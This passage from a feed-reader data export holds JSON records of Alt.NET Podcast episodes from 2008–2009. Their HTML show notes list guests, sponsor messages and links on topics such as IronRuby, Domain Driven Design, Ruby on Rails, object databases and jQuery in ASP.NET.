href=\"http://www.dimecasts.net/Casts/ByTag/NHibernate\">NHibernate DimeCasts</a></li><li><a href=\"\">Fluent NHibernate</a></li><li><a href=\"http://fluentnhibernate.org/\">NHibernate Profiler</a></li><li><a href=\"http://codebetter.com\">CodeBetter</a></li><li><a href=\"http://www.microsoft.com/net/Dublin.aspx\">Dublin</a></li><li><a href=\"http://code.google.com/p/masstransit/\">Mass Transit</a></li><li><a href=\"http://www.nservicebus.com/\">NServiceBus</a></li><li><a href=\"http://devlicio.us/blogs/derik_whittaker/archive/tags/NHibernate/default.aspx\">Derik Whittaker's NHibernate Posts</a></li><li><a href=\"http://www.codeplex.com/oxite\">Oxite</a></li><li><a href=\"http://www.lostechies.com/blogs/chad_myers/archive/2008/12/20/oxite-review.aspx\">Chad Myers Oxite Post</a></li></ul></p><p>-James<br/><a href=\"http://infozerk.com/averyblog\">My Blog</a><br/><a href=\"http://twitter.com/averyj\">Follow me on twitter</a><br/></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/altnetpodcast?a=I4VXHI5-6Mg:SLFo-iK4eeU:pyKRbNaQCGs\"><img src=\"http://feeds.feedburner.com/~ff/altnetpodcast?i=I4VXHI5-6Mg:SLFo-iK4eeU:pyKRbNaQCGs\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/altnetpodcast/~4/I4VXHI5-6Mg\" height=\"1\" width=\"1\"/>","author":"James Avery - javery@infozerk.com","_id":{"$wrap":"$oid","v":961}}
{"k":"0000000082","o":"0000002830","v":"001"}
{"_id":962,"_uid":962,"_dt":1373740492902,"_s":"ebc456507ec583e2a82ea8a1a2f370aa"}
{"subscription":{"$wrap":"$oid","v":3},"link":"http://feedproxy.google.com/~r/altnetpodcast/~3/7hwl2xthd5I/","title":"17: The State of Alt.Net","published":{"$wrap":"$date","v":1236379980000,"h":"2009-03-06T22:53:00.000Z"},"starred":false,"read":false,"content":"<p><a href=\"http://blowmage.com\">Mike Moore</a>came out of retirement for one more conversation with<a href=\"http://ampgt.com/\">Scott Bellware</a>on the current state of Alt.NET.</p><p>Scott's Tweets:<ul><li><A href=\"http://twitter.com/bellware/statuses/1268265513\">and people wonder why I refute alt.net. it has merely become the new fundamentalism that was predicted two years ago at Austin altnetconf.</a></li><li><A href=\"http://twitter.com/bellware/statuses/1268274464\">alt.net's sole struggle appears to be to replace the current problematic status quo and replace it with itself</a></li><li><a href=\"http://twitter.com/bellware/statuses/1268328577\">alt.net has become the problem that it had sought to address. it is the next gen problem that will hopefully inspire much deeper movement.</a></li><li><a href=\"http://twitter.com/bellware/statuses/1268477025\">i am likely the only person who has sat and wept at the loss of potential that is what has become of alt.net. so much work. so much lost.</a></li><li><a href=\"http://twitter.com/bellware/statuses/1268482837\">alt.net is increasingly an avenue to increased microsoft payola for former progressive community voices</a></li></ul></p><p>The Curve:</p><p><img src=\"http://altnetpodcast.com/images/curve2.png\" width=\"500px\"/></p><p>Mike and Scott cover the following:<br/><ul><li><a href=\"http://en.wikipedia.org/wiki/Crossing_the_Chasm\">Crossing the Chasm</a></li><li><a href=\"http://blog.scottbellware.com/2009/02/teaching-symbology-and-intellectual_01.html\">Teaching, Symbology, and Intellectual Materialism – The Chasm is a Vacuum</a></li><li>\"Lonely people commiserating together.\"</li><li>Technology evangelism</li><li>Progressive software development</li><li>Software craftsmanship</li><li>SOLID principles</li><li><a href=\"http://www.lostechies.com/blogs/chad_myers/archive/2008/03/07/pablo-s-topic-of-the-month-march-solid-principles.aspx\">Chad Meyers Posts</a></li><li>\"Every tool is a weapon - if you hold it right.\"  -<a href=\"http://en.wikiquote.org/wiki/Ani_DiFranco\">Ani DiFranco</a></li><li>Orthodoxy&dogma</li></p><p>-James and Mike</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/altnetpodcast?a=7hwl2xthd5I:ddYGwtEgj-M:pyKRbNaQCGs\"><img src=\"http://feeds.feedburner.com/~ff/altnetpodcast?i=7hwl2xthd5I:ddYGwtEgj-M:pyKRbNaQCGs\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/altnetpodcast/~4/7hwl2xthd5I\" height=\"1\" width=\"1\"/>","author":"James Avery - javery@infozerk.com","_id":{"$wrap":"$oid","v":962}}
{"k":"0000000082","o":"0000002130","v":"001"}
{"_id":963,"_uid":963,"_dt":1373740492903,"_s":"f02f06f602a390400bc3eac4ed8e70b1"}
{"subscription":{"$wrap":"$oid","v":3},"link":"http://feedproxy.google.com/~r/altnetpodcast/~3/DcpEYrN3I9M/","title":"16: State of IronRuby 2009","published":{"$wrap":"$date","v":1235697180000,"h":"2009-02-27T01:13:00.000Z"},"starred":false,"read":false,"content":"<p>In my first solo-episode of the IronRuby podcast I talk with John Lam to get an update on the IronRuby project.</p><div class=\"sponsorship\"><a title=\"The Lounge Advertising Network\" href=\"http://theloungenet.com/\"><img width=\"300\" height=\"250\" border=\"0\" alt=\"The Lounge Advertising Network\" title=\"The Lounge Advertising Network\" src=\"http://altnetpodcast.com/images/sponsors/lounge-1.png\"/></a></div><p>This episode of the Alt.NET Podcast is brought to you by<a href=\"http://theloungenet.com/\">The Lounge Advertising Network</a>. Reach .NET developers on the sites and blogs that they trust and respect by advertising with<a href=\"http://theloungenet.com/\">The Lounge Advertising Network</a>.</p><p>We discuss the following:</p><ul><li><a href=\"http://rubyconf2008.confreaks.com/ironruby.html\">John Lam's talk at RubyConf 08 ** Watch This! **</a></li><li><a href=\"http://github.com/ironruby\">IronRuby Repository on Github</a></li><li><a href=\"http://rubyforge.org/tracker/?group_id=4359\">IronRuby Bug Tracker on RubyForge</a></li><li><a href=\"http://ironruby.info\">IronRuby.info</a></li><li><a href=\"http://msdn.microsoft.com/en-us/magazine/dd453038.aspx\">MSDN: Automate Acceptance Testing With IronRuby</a></li><li><a href=\"http://rubyspec.org/\">RubySpec Project</a></li><li><a href=\"http://www.paint.net/\">Paint.NET</a></li></ul><p>-<a href=\"http://infozerk.com/averyblog\">James Avery</a></p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/altnetpodcast?a=DcpEYrN3I9M:vK6oLhZtMYw:pyKRbNaQCGs\"><img src=\"http://feeds.feedburner.com/~ff/altnetpodcast?i=DcpEYrN3I9M:vK6oLhZtMYw:pyKRbNaQCGs\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/altnetpodcast/~4/DcpEYrN3I9M\" height=\"1\" width=\"1\"/>","author":"James Avery - javery@infozerk.com","_id":{"$wrap":"$oid","v":963}}
{"k":"0000000082","o":"0000003489","v":"001"}
{"_id":964,"_uid":964,"_dt":1373740492903,"_s":"4fc7ea3f4e9d662b4dd81066efdf6987"}
{"subscription":{"$wrap":"$oid","v":3},"link":"http://feedproxy.google.com/~r/altnetpodcast/~3/HmRl84D0Nq0/","title":"15: Domain Driven Design","published":{"$wrap":"$date","v":1231899540000,"h":"2009-01-14T02:19:00.000Z"},"starred":false,"read":false,"content":"<p>In this episode, I talk with<a href=\"http://blog.wekeroad.com/\">Rob Conery</a>and<a href=\"http://infozerk.com/averyblog/\">James Avery</a>about Domain Driven Design.</p><div class=\"sponsorship\"><a title=\"The Lounge Advertising Network\" href=\"http://theloungenet.com/\"><img width=\"300\" height=\"250\" border=\"0\" alt=\"The Lounge Advertising Network\" title=\"The Lounge Advertising Network\" src=\"http://altnetpodcast.com/images/sponsors/lounge-1.png\"/></a></div><p>This episode of the Alt.NET Podcast is brought to you by<a href=\"http://theloungenet.com/\">The Lounge Advertising Network</a>. Reach .NET developers on the sites and blogs that they trust and respect by advertising with<a href=\"http://theloungenet.com/\">The Lounge Advertising Network</a>.</p><p>We discuss the following:</p><ul><li>Understanding the business</li><li><a href=\"http://blog.wekeroad.com/mvc-storefront/\">ASP.NET MVC Storefront</a></li><li><a href=\"http://www.hanselminutes.com/default.aspx?showID=158\">Rob Conery limps and learns about Domain Driven Design</a></li><li>Philosophical underpinnings of DDD</li><li>Redundancy in the Space Shuttle</li><li><a href=\"http://domaindrivendesign.org/discussion/messageboardarchive/BoundedContext.html\">Bounded Context</a></li><li><a href=\"http://domaindrivendesign.org/discussion/messageboardarchive/Aggregates.html\">Aggregate Root</a></li><li><a href=\"http://books.google.com/books?id=RZXGAAAACAAJ\">Applying Domain-driven Design and Patterns</a></li><li><a href=\"http://en.wikipedia.org/wiki/State_pattern\">State Pattern</a></li><li>Continuous Improvement</li><li>And best of all, listen along as Rob drops the names of the following people:<ul><li><a href=\"http://bradwilson.typepad.com/\">Brad Wilson</a></li><li><a href=\"http://codebetter.com/blogs/david_laribee/\">Dave Laribee</a>(twice)</li><li><a href=\"http://www.hanselman.com/blog/\">Scott Hanselman</a>(twice)</li><li><a href=\"http://www.scottbellware.com/\">Scott Bellware</a>(twice)</li><li><a href=\"http://bentaylor.org/\">Ben Taylor</a>(twice)</li><li><a href=\"http://jimmynilsson.com/blog/\">Jimmy Nilsson</a></li><li><a href=\"http://www.lostechies.com/blogs/jimmy_bogard/\">Jimmy Bogard</a></li><li><a href=\"http://www.domainlanguage.com/about/ericevans.html\">Eric Evans</a></li></ul></li></ul><p>This is my last episode hosting the Alt.NET Podcast. I want to thank the many gracious guests that have helped make the podcast such a success, and the listeners that have supported us and endured my scratchy voice. I hope that both the Alt.NET and the larger .NET communities have benefited from the podcast.<a href=\"http://infozerk.com/averyblog/\">James Avery</a>is taking over the podcast and I am very excited to see where he goes and what improvements he makes.</p><p>~<a href=\"http://blowmage.com/\">Mike Moore</a></p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~f/altnetpodcast?a=kUsxEWV5\"><img src=\"http://feeds.feedburner.com/~f/altnetpodcast?i=kUsxEWV5\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/altnetpodcast/~4/HmRl84D0Nq0\" height=\"1\" width=\"1\"/>","author":"Mike Moore - javery@infozerk.com","_id":{"$wrap":"$oid","v":964}}
{"k":"0000000082","o":"0000003372","v":"001"}
{"_id":965,"_uid":965,"_dt":1373740492903,"_s":"7d0531257bdcaae2acf69d59cd5599a8"}
{"subscription":{"$wrap":"$oid","v":3},"link":"http://feedproxy.google.com/~r/altnetpodcast/~3/hGZisL8W87Y/","title":"13: Ruby on Rails","published":{"$wrap":"$date","v":1230517080000,"h":"2008-12-29T02:18:00.000Z"},"starred":false,"read":false,"content":"<p>In this episode, I talk with<a href=\"http://brianeng.com/\">Brian Eng</a>and<a href=\"http://www.jeffcohenonline.com/\">Jeff Cohen</a>from the<a href=\"http://www.softiesonrails.com/\">Softies on Rails blog</a>, and<a href=\"http://infozerk.com/averyblog/\">James Avery</a>about the Ruby on Rails web framework and what Alt.NET can learn from it.</p><div class=\"sponsorship\"><a title=\"ANTS Profiler\" href=\"http://www.red-gate.com/products/ants_profiler/why_own_code_profiler.htm?utm_source=altnet&utm_medium=box&utm_content=whyownprofiler&utm_campaign=antsprofiler\"><img width=\"300\" height=\"250\" border=\"0\" alt=\"ANTS Profiler\" title=\"ANTS Profiler\" src=\"http://altnetpodcast.com/images/sponsors/redgate-2.gif\"/></a></div><p>This episode of the Alt.NET Podcast is brought to you by Red Gate’s<a href=\"http://www.red-gate.com/products/ants_profiler/why_own_code_profiler.htm?utm_source=altnet&utm_medium=box&utm_content=whyownprofiler&utm_campaign=antsprofiler\">ANTS Profiler</a>. First-class developers insist on knowing how their code performs before releasing to the wild. ANTS Profiler from Red Gate Software is a very easy to use .NET profiler that will analyze your code’s performance so you can identify any bottlenecks<em>before</em>you ship. Using ANTS Profiler gives you that extra edge that makes all the difference in the world, since you can fix any known issues before shipping – and before anyone notices! ANTS Profiler can be a lifesaver, so if you want to get your hands on it download the<a href=\"http://www.red-gate.com/products/ants_profiler/why_own_code_profiler.htm?utm_source=altnet&utm_medium=box&utm_content=whyownprofiler&utm_campaign=antsprofiler\">14-day free trial</a>.</p><p>We discuss the following:</p><ul><li><a href=\"http://rubyonrails.org/\">Ruby on Rails</a></li><li><a href=\"http://www.softiesonrails.com/\">Softies on Rails blog</a></li><li><a href=\"http://www.pragprog.com/titles/cerailn/rails-for-net-developers\">Rails for .NET Developers</a></li><li><a href=\"http://ironruby.net/\">IronRuby</a></li><li><a href=\"http://www.pragprog.com/titles/tpp/the-pragmatic-programmer\">Learn a new language each year</a></li><li><a href=\"http://www.martinfowler.com/bliki/DomainSpecificLanguage.html\">Domain Specific Languages</a></li><li>Hacker Mentality</li><li>Sneaking Ruby into the Enterprise</li><li><a href=\"http://rake.rubyforge.org/\">Rake</a></li><li>Rails’ “Sweet Spot”</li><li>Separation of Concerns</li><li>Test Driven Development</li><li>Agile Mindset</li><li>Writing the book</li><li>Opinionated Software</li><li><a href=\"http://jruby.codehaus.org/\">JRuby</a></li><li>Making Open Source contributions</li><li>Importance of software documentation</li></ul></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~f/altnetpodcast?a=T4fwn5tb\"><img src=\"http://feeds.feedburner.com/~f/altnetpodcast?i=T4fwn5tb\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/altnetpodcast/~4/hGZisL8W87Y\" height=\"1\" width=\"1\"/>","author":"Mike Moore - javery@infozerk.com","_id":{"$wrap":"$oid","v":965}}
{"k":"0000000082","o":"0000003010","v":"001"}
{"_id":966,"_uid":966,"_dt":1373740492904,"_s":"fde1405172619edb13c27a78db935e83"}
{"subscription":{"$wrap":"$oid","v":3},"link":"http://feedproxy.google.com/~r/altnetpodcast/~3/tlHL4beE5GY/","title":"14: Object Databases","published":{"$wrap":"$date","v":1231467480000,"h":"2009-01-09T02:18:00.000Z"},"starred":false,"read":false,"content":"<p>In this episode, I talk with<a href=\"http://blog.wekeroad.com/\">Rob Conery</a>and<a href=\"http://infozerk.com/averyblog/\">James Avery</a>about object databases.</p><div class=\"sponsorship\"><a title=\"ANTS Profiler\" href=\"http://www.red-gate.com/products/ants_profiler/why_own_code_profiler.htm?utm_source=altnet&utm_medium=box&utm_content=whyownprofiler&utm_campaign=antsprofiler\"><img width=\"300\" height=\"250\" border=\"0\" alt=\"ANTS Profiler\" title=\"ANTS Profiler\" src=\"http://altnetpodcast.com/images/sponsors/redgate-2.gif\"/></a></div><p>This episode of the Alt.NET Podcast is brought to you by Red Gate’s<a href=\"http://www.red-gate.com/products/ants_profiler/why_own_code_profiler.htm?utm_source=altnet&utm_medium=box&utm_content=whyownprofiler&utm_campaign=antsprofiler\">ANTS Profiler</a>. Have you ever needed to boost the performance of your .NET app? Or understand how your code is behaving? Or why it isn’t behaving in the way you want it to? A code profiler like ANTS Profiler from Red Gate can help. It provides you with quantitative data such as hit count and code timings, so you don’t have to waste time guessing where bottlenecks might be. Make your algorithms run more efficiently and improve your applications by downloading the<a href=\"http://www.red-gate.com/products/ants_profiler/why_own_code_profiler.htm?utm_source=altnet&utm_medium=box&utm_content=whyownprofiler&utm_campaign=antsprofiler\">14-day free trial</a>.</p><p>We discuss the following:</p><ul><li><a href=\"http://en.wikipedia.org/wiki/Object_database\">Object Database</a></li><li><a href=\"http://martinfowler.com/bliki/DatabaseStyles.html\">Database Styles</a><ul><li><a href=\"http://martinfowler.com/bliki/IntegrationDatabase.html\">Integration Database</a></li><li><a href=\"http://martinfowler.com/bliki/ApplicationDatabase.html\">Applicatioon Database</a></li></ul></li><li><a href=\"http://www.matisse.com/\">Matisse</a></li><li><a href=\"http://www.db4o.com/\">DB4Objects</a></li><li><a href=\"http://blog.wekeroad.com/blog/crazy-talk-reducing-orm-friction/\">Crazy Talk: Reducing ORM Friction</a></li><li>Database YAGNI</li><li><a href=\"http://en.wikipedia.org/wiki/Object_database#Adoption_of_object_databases\">Adoption of Object Databases</a></li><li><a href=\"http://en.wikipedia.org/wiki/Object_Query_Language\">Object Query Language</a></li></ul></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~f/altnetpodcast?a=7Sb0MlR9\"><img src=\"http://feeds.feedburner.com/~f/altnetpodcast?i=7Sb0MlR9\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/altnetpodcast/~4/tlHL4beE5GY\" height=\"1\" width=\"1\"/>","author":"Mike Moore - javery@infozerk.com","_id":{"$wrap":"$oid","v":966}}
{"k":"0000000082","o":"0000004864","v":"001"}
{"_id":967,"_uid":967,"_dt":1373740492904,"_s":"db4dfcdc6d51e51cdd40c3bbb80d0b78"}
{"subscription":{"$wrap":"$oid","v":3},"link":"http://feedproxy.google.com/~r/altnetpodcast/~3/edXdjwMGavg/","title":"10: OOP in Ruby","published":{"$wrap":"$date","v":1220235300000,"h":"2008-09-01T02:15:00.000Z"},"starred":false,"read":false,"content":"<p>In this episode, I talk with<a href=\"http://scottbellware.com/\">Scott Bellware</a>about object-oriented programming in Ruby, and Ruby’s object model. This is taken from a private conversation, and the audio quality suffers at times. Much thanks to Scott for allowing this to be released.</p><div class=\"sponsorship\"><a title=\"ANTS Profiler\" href=\"http://www.red-gate.com/products/ants_profiler/why_own_code_profiler.htm?utm_source=altnet&utm_medium=box&utm_content=whyownprofiler&utm_campaign=antsprofiler\"><img width=\"300\" height=\"250\" border=\"0\" alt=\"ANTS Profiler\" title=\"ANTS Profiler\" src=\"http://altnetpodcast.com/images/sponsors/redgate-2.gif\"/></a></div><p>This episode of the Alt.NET Podcast is brought to you by Red Gate’s<a href=\"http://www.red-gate.com/products/ants_profiler/why_own_code_profiler.htm?utm_source=altnet&utm_medium=box&utm_content=whyownprofiler&utm_campaign=antsprofiler\">ANTS Profiler</a>. Have you ever needed to boost the performance of your .NET app? Or understand how your code is behaving? Or why it isn’t behaving in the way you want it to? A code profiler like ANTS Profiler from Red Gate can help. It provides you with quantitative data such as hit count and code timings, so you don’t have to waste time guessing where bottlenecks might be. Make your algorithms run more efficiently and improve your applications by downloading the<a href=\"http://www.red-gate.com/products/ants_profiler/why_own_code_profiler.htm?utm_source=altnet&utm_medium=box&utm_content=whyownprofiler&utm_campaign=antsprofiler\">14-day free trial</a>.</p><p>We discuss the following:</p><ul><li><a href=\"http://www.pragprog.com/screencasts/v-dtrubyom/the-ruby-object-model-and-metaprogramming\">The Ruby Object Model and Metaprogramming</a>screencasts with<a href=\"http://pragdave.pragprog.com/\">Dave Thomas</a></li><li>“Actually I made up the term “object-oriented”, and I can tell you I did not have C++ in mind.” —<a href=\"http://en.wikiquote.org/wiki/Alan_Kay\">Alan Kay</a></li><li><a href=\"http://c2.com/cgi/wiki?IsCeePlusPlusObjectOriented\">Is C++ Object-Oriented?</a></li><li><a href=\"http://blowmage.com/2008/3/10/ironruby-csharp-awesomeness\">IronRuby + C# = Awesomeness</a></li><li><a href=\"http://www.amazon.com/Object-Thinking-DV-Microsoft-Professional-David/dp/0735619654\">Object Thinking</a></li><li>Neal Ford’s<a href=\"http://memeagora.blogspot.com/\">Meme Agora</a>blog<ul><li><a href=\"http://memeagora.blogspot.com/2007/09/ruby-matters-place-to-put-your-stuff.html\">Ruby Matters: A Place to Put Your Stuff</a></li><li><a href=\"http://memeagora.blogspot.com/2007/09/ruby-matters-meta-programming-synthesis.html\">Ruby Matters: Meta-programming, Synthesis, and Generation</a></li><li><a href=\"http://memeagora.blogspot.com/2007/09/ruby-matters-design-patterns-in-dynamic.html\">Ruby Matters: “Design Patterns” in Dynamic Languages</a></li><li><a href=\"http://memeagora.blogspot.com/2007/10/ruby-matters-language-beauty-part-1.html\">Ruby Matters: Language Beauty Part 1</a></li><li><a href=\"http://memeagora.blogspot.com/2007/10/ruby-matters-language-beauty-part-2.html\">Ruby Matters: Language Beauty Part 2</a></li><li><a href=\"http://memeagora.blogspot.com/2007/10/ruby-matters-contracts-vs-promises.html\">Ruby Matters: Contracts vs. Promises</a></li><li><a href=\"http://memeagora.blogspot.com/2007/10/ruby-matters-unleash-brainiacs.html\">Ruby Matters: Unleash the Brainiacs!</a></li><li><a href=\"http://memeagora.blogspot.com/2007/11/ruby-matters-frameworks-dsls-and.html\">Ruby Matters: Frameworks, DSLs, and Dietzler’s Rule</a></li></ul></li><li>Polymorphism by Inheritance vs. Behavior</li><li>Overuse the Matrix analogy</li><li>Message passing vs. method invocation</li><li>IronRuby and the DLR</li><li>Polyglot Programming</li><li><a href=\"http://livelabs.com/volta/\">Microsoft Live Labs Vota</a></li><li>One language to rule them all</li><li>Mentors and mentorship</li></ul><p>P.S. I first met Scott when I interviewed him on the<a href=\"http://rubiverse.com/\">Rubiverse</a>podcast a year ago. You may also find<a href=\"http://rubiverse.com/podcasts/2-scott-bellware-on-microsoft-and-ruby\">that conversation</a>interesting.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~f/altnetpodcast?a=fLin3eNv\"><img src=\"http://feeds.feedburner.com/~f/altnetpodcast?i=fLin3eNv\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/altnetpodcast/~4/edXdjwMGavg\" height=\"1\" width=\"1\"/>","author":"Mike Moore - javery@infozerk.com","_id":{"$wrap":"$oid","v":967}}
{"k":"0000000082","o":"0000003249","v":"001"}
{"_id":968,"_uid":968,"_dt":1373740492904,"_s":"113e72d3c255158f2277c179aa0919a9"}
{"subscription":{"$wrap":"$oid","v":3},"link":"http://feedproxy.google.com/~r/altnetpodcast/~3/s7wFAv15qmI/","title":"11: JQuery in ASP.NET","published":{"$wrap":"$date","v":1223259360000,"h":"2008-10-06T02:16:00.000Z"},"starred":false,"read":false,"content":"<p>In this episode<a href=\"http://www.chrisbrandsma.com/\">Chris Brandsma</a>,<a href=\"http://www.west-wind.com/weblog/\">Rick Strahl</a>,<a href=\"http://encosia.com/\">Dave Ward</a>,<a href=\"http://weblogs.asp.net/Bleroy/\">Bertrand Le Roy</a>,<a href=\"http://www.lazycoder.com/\">Scott Koon</a>, and<a href=\"http://stevenharman.net/\">Steven Harman</a>discuss Microsoft’s jQuery in ASP.NET announcement.</p><div class=\"sponsorship\"><a title=\"LLBLGen Pro\" href=\"http://www.llblgen.com/\"><img width=\"300\" height=\"250\" border=\"0\" alt=\"LLBLGen Pro\" title=\"LLBLGen Pro\" src=\"http://altnetpodcast.com/images/sponsors/llblgenpro-1.gif\"/></a></div><p>This episode of the Alt.NET Podcast is brought to you by<a href=\"http://www.llblgen.com/\">LLBLGen Pro</a>, the most mature O/R mapper and code generator out there.</p><p>Are you looking for a truly flexible, powerful data-access solution for .NET? Look no further, use the best:<a href=\"http://www.llblgen.com/\">LLBLGen Pro</a>. Now with full Linq support!</p><p>Download the<a href=\"http://www.llblgen.com/\">free trial</a>today.</p><p>The panel discusses the following:</p><ul><li>JavaScript<ul><li><a href=\"http://www.amazon.com/JavaScript-Good-Parts-Douglas-Crockford/dp/0596517742\">JavaScript: The Good Parts</a></li><li><a href=\"http://www.mozilla.com/firefox/\">FireFox</a>and<a href=\"http://getfirebug.com/\">Firebug</a></li><li><a href=\"http://wikipedia.org/wiki/AJAX\">AJAX</a></li><li><a href=\"http://steve-yegge.blogspot.com/2007/02/next-big-language.html\">The Next Big Language</a></li><li><a href=\"http://wikipedia.org/wiki/Prototype-based_programming\">Prototype Model</a></li><li><a href=\"http://wikipedia.org/wiki/Closure_(computer_science)\">Closures</a></li></ul></li><li><a href=\"http://jquery.com/\">jQuery</a><ul><li><a href=\"http://docs.jquery.com/Main_Page\">Documentation</a></li><li><a href=\"http://ui.jquery.com/\">jQuery UI</a></li><li><a href=\"http://plugins.jquery.com/\">jQuery Plugins</a></li></ul></li><li>Microsoft shipping jQuery in ASP.NET<ul><li><a href=\"http://jquery.com/blog/2008/09/28/jquery-microsoft-nokia/\">John Resig’s announcement</a></li><li><a href=\"http://weblogs.asp.net/scottgu/archive/2008/09/28/jquery-and-microsoft.aspx\">Scott Guthrie’s announcement</a></li></ul></li><li><a href=\"http://www.w3.org/TR/css3-selectors/\">CSS3 Selectors</a></li><li>Code Generation</li><li>Is this a “Win” for<a href=\"http://altdotnet.org/\">ALT.NET</a>?</li><li>Microsoft accepting user-contributed code</li></ul><p>The panel’s conversation continues in the next episode…</p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~f/altnetpodcast?a=cRB3xnqN\"><img src=\"http://feeds.feedburner.com/~f/altnetpodcast?i=cRB3xnqN\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/altnetpodcast/~4/s7wFAv15qmI\" height=\"1\" width=\"1\"/>","author":"Mike Moore - javery@infozerk.com","_id":{"$wrap":"$oid","v":968}}
{"k":"0000000082","o":"0000002100","v":"001"}
{"_id":969,"_uid":969,"_dt":1373740492905,"_s":"00b9de3281a0d41374f068f1e1ae0e99"}
{"subscription":{"$wrap":"$oid","v":3},"link":"http://feedproxy.google.com/~r/altnetpodcast/~3/Id3EUxOe_5I/","title":"12: More JQuery in ASP.NET","published":{"$wrap":"$date","v":1224036960000,"h":"2008-10-15T02:16:00.000Z"},"starred":false,"read":false,"content":"<p>In this episode<a href=\"http://www.chrisbrandsma.com/\">Chris Brandsma</a>,<a href=\"http://www.west-wind.com/weblog/\">Rick Strahl</a>,<a href=\"http://encosia.com/\">Dave Ward</a>,<a href=\"http://weblogs.asp.net/Bleroy/\">Bertrand Le Roy</a>, and<a href=\"http://www.lazycoder.com/\">Scott Koon</a>conclude their discussion of Microsoft’s jQuery in ASP.NET announcement<sup class=\"footnote\"><a href=\"#fn1\">1</a></sup>.</p><div class=\"sponsorship\"><a title=\"LLBLGen Pro\" href=\"http://www.llblgen.com/\"><img width=\"300\" height=\"250\" border=\"0\" alt=\"LLBLGen Pro\" title=\"LLBLGen Pro\" src=\"http://altnetpodcast.com/images/sponsors/llblgenpro-1.gif\"/></a></div><p>This episode of the Alt.NET Podcast is brought to you by<a href=\"http://www.llblgen.com/\">LLBLGen Pro</a>, the most mature O/R mapper and code generator out there.</p><p>Are you looking for a truly flexible, powerful data-access solution for .NET? Look no further, use the best:<a href=\"http://www.llblgen.com/\">LLBLGen Pro</a>. Now with full Linq support!</p><p>Download the<a href=\"http://www.llblgen.com/\">free trial</a>today.</p><p class=\"footnote\" id=\"fn1\"><sup>1</sup><a href=\"http://stevenharman.net/\">Steven Harman</a>lost his hard drive part way through and was unable to remain on the call. You can leave him your heart felt condolences on<a href=\"http://stevenharman.net/blog/archive/2008/10/07/altnet-podcast-jquery-and-microsoft.aspx\">his blog</a>.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~f/altnetpodcast?a=wY4gGs2F\"><img src=\"http://feeds.feedburner.com/~f/altnetpodcast?i=wY4gGs2F\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/altnetpodcast/~4/Id3EUxOe_5I\" height=\"1\" width=\"1\"/>","author":"Mike Moore - javery@infozerk.com","_id":{"$wrap":"$oid","v":969}}
{"k":"0000000082","o":"0000002940","v":"001"}
{"_id":970,"_uid":970,"_dt":1373740492905,"_s":"309bc90de4ed7ca5bfc9a4fcd8a01263"}
{"subscription":{"$wrap":"$oid","v":3},"link":"http://feedproxy.google.com/~r/altnetpodcast/~3/uX7lPV2FUPc/","title":"9: State of IronRuby","published":{"$wrap":"$date","v":1219889640000,"h":"2008-08-28T02:14:00.000Z"},"starred":false,"read":false,"content":"<p>In this episode, I talk with<a href=\"http://rubydoes.net/\">Aaron Junod</a>and<a href=\"http://blog.prokrams.com/\">Michael Letterle</a>on the state of the<a href=\"http://www.ironruby.net/\">IronRuby</a>project for the .NET framework.</p><div class=\"sponsorship\"><a title=\"ANTS Profiler\" href=\"http://www.red-gate.com/products/ants_profiler/why_own_code_profiler.htm?utm_source=altnet&utm_medium=box&utm_content=whyownprofiler&utm_campaign=antsprofiler\"><img width=\"300\" height=\"250\" border=\"0\" alt=\"ANTS Profiler\" title=\"ANTS Profiler\" src=\"http://altnetpodcast.com/images/sponsors/redgate-2.gif\"/></a></div><p>This episode of the Alt.NET Podcast is brought to you by Red Gate’s<a href=\"http://www.red-gate.com/products/ants_profiler/why_own_code_profiler.htm?utm_source=altnet&utm_medium=box&utm_content=whyownprofiler&utm_campaign=antsprofiler\">ANTS Profiler</a>. First-class developers insist on knowing how their code performs before releasing to the wild. ANTS Profiler from Red Gate Software is a very easy to use .NET profiler that will analyze your code’s performance so you can identify any bottlenecks<em>before</em>you ship. Using ANTS Profiler gives you that extra edge that makes all the difference in the world, since you can fix any known issues before shipping – and before anyone notices! ANTS Profiler can be a lifesaver, so if you want to get your hands on it download the<a href=\"http://www.red-gate.com/products/ants_profiler/why_own_code_profiler.htm?utm_source=altnet&utm_medium=box&utm_content=whyownprofiler&utm_campaign=antsprofiler\">14-day free trial</a>.</p><p>We discuss the following:</p><ul><li><a href=\"http://ruby-doc.org/whyruby\">Why Ruby?</a></li><li><a href=\"http://c2.com/cgi/wiki?DynamicTyping\">Dynamic Typing</a></li><li>How Ruby has affected the industry</li><li>Microsoft accepting<a href=\"http://www.microsoft.com/opensource/licenses.mspx\">community contributions</a></li><li>What about running IronRuby on Rails?</li><li>What about running IronRuby on the ASP.NET MVC?</li><li>Sneaking Ruby into the enterprise with IronRuby</li><li>IronRuby’s readiness</li><li><a href=\"http://www.ruby-lang.org/\">Ruby Programming Language</a></li><li><a href=\"http://tryruby.hobix.com/\" title=\"in your browser\">try ruby!</a></li></ul></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~f/altnetpodcast?a=1HTNYZMX\"><img src=\"http://feeds.feedburner.com/~f/altnetpodcast?i=1HTNYZMX\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/altnetpodcast/~4/uX7lPV2FUPc\" height=\"1\" width=\"1\"/>","author":"Mike Moore - javery@infozerk.com","_id":{"$wrap":"$oid","v":970}}
{"k":"0000000082","o":"0000000713","v":"001"}
{"_id":971,"_uid":971,"_dt":1373740493931,"_s":"a73efd1f90af54fef783b867292d2471"}
